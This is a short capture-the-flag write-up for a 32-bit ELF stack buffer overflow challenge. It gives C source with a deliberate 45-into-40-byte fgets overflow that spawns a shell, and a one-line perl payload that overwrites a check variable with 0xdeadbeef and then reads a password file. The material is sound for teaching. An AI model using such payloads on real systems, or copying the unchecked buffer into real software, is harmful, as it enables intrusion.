## ELF32 - Stack buffer overflow basic 1

| Author | Level | Points |
| ------ | ----- | ------ |
| Lyes | Very Easy | 5 |

><b> Statement </b> <br />
>Environment configuration : 
> * [ ] Postion Independent Executable 
> * [ ] Read Only relocations
> * [ ] Non-Executable Stack 
> * [ ] Non-Executable Heap 
> * [ ] Address Space Layout Randomisation 
> * [ ] Source Fortification 
> * [x] Source code access
>
>Source code :
>
>```c
>#include <stdlib.h>
>#include <stdio.h>
> 
>/*
>gcc -m32 -o ch13 ch13.c -fno-stack-protector
>*/
>
>int main()
>{
>   
>  int var;
>  int check = 0x04030201;
>  char buf[40];
>	   
>  fgets(buf,45,stdin);
>      
>  printf("\n[buf]: %s\n", buf);
>  printf("[check] %p\n", check);
>		   
>  if ((check != 0x04030201) && (check != 0xdeadbeef))
>    printf ("\nYou are on the right way !\n");
>			  
>  if (check == 0xdeadbeef)
>  {
>    printf("Yeah dude ! You win !\n");
>    system("/bin/dash");
>  }
>  return 0;
>}
>```

#### Solution

```
(perl -e ';print "a"x40 ."\xef\xbe\xad\xde";'; echo 'cat .passwd') | ./ch13
```
